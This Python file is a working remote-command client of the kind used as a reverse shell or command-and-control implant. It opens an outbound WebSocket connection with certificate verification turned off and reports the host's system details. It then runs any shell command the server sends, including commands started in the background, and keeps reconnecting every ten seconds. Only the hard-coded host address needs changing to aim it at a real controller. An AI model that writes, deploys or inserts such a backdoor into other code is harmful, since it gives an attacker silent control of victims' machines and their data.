import asyncio
import websockets
import subprocess
import platform
import ssl
import json
import os
from sys import exit

# --- Basic Configuration ---
# HOST: IP address of the server to connect to
# PORT: Port number of the server to connect to
HOST = '127.0.0.1' 
PORT = 8765

# --- Get System Information ---

def get_systeminfo():
    """Get detailed system information"""
    system = platform.system()
    node = platform.node()
    release = platform.release()
    version = platform.version()
    machine = platform.machine()
    processor = platform.processor()
    systeminfo = f"{system} {node} {release} {version} {machine} {processor}"
    return systeminfo
    
# --- Controlled End Logic ---
class Execute_command:
    """Command execution class for executing system commands locally"""
    def execute_command(self, command):
        """Execute system command and return result"""
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            stdout = result.stdout
            # If output is too long, truncate it to avoid transferring large data
            if len(stdout) > 900000:
                stdout = stdout[:900000] + "..."
            return {
                "Command to execute": command,
                "Return code": result.returncode,
                "Output result": stdout,
                "Error output": result.stderr
            }
        except Exception as e:
            return {
                "Command to execute": command,
                "Error": str(e)
            }

    def change_directory(self, directory):
        """Change working directory"""
        try:
            os.chdir(directory)
            return "[bold green]Successfully changed working directory[/bold green]"
        except Exception as e:
            return "[bold red]Failed to change working directory[/bold red]: " + str(e)
    
    def background(self, command):
        """Execute command in background"""
        try:
            subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return "[bold green]Command is now running in background[/bold green]"
        except Exception as e:
            return "[bold red]Failed to run command in background[/bold red]: " + str(e)

# --- Client Logic ---
async def client_loop():
    """
    Client main loop
    Responsible for establishing connection with server and handling received commands
    """
    # Configure SSL context, disable certificate verification
    # Do not use this configuration in untrusted environments
    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE

    while True:
        try:
            # Try to connect to server
            async with websockets.connect(f'wss://{HOST}:{PORT}', ssl=ssl_context, ping_interval=10) as websocket:
                execute_command = Execute_command()
                # Send system information
                await websocket.send(get_systeminfo())
                # Continuously receive and process commands sent by server
                async for command in websocket:
                    match command:
                        case "exit": exit()
                        case command if command.startswith("command:"): 
                            # Execute command and send result back to server
                            await websocket.send(json.dumps(execute_command.execute_command(command[8:]), ensure_ascii=False))
                        case command if command.startswith("cd:"):
                            # Change working directory
                            await websocket.send(execute_command.change_directory(command[3:]))
                        case command if command.startswith("background:"):
                            # Run command in background
                            await websocket.send(execute_command.background(command[11:]))

        except Exception:
            # Wait 10 seconds before retrying when an exception occurs
            await asyncio.sleep(10)
        except KeyboardInterrupt:
            exit()

# --- Main Function ---
if __name__ == "__main__":
    """Program entry point"""
    try:
        asyncio.run(client_loop())
    except KeyboardInterrupt:
        exit()
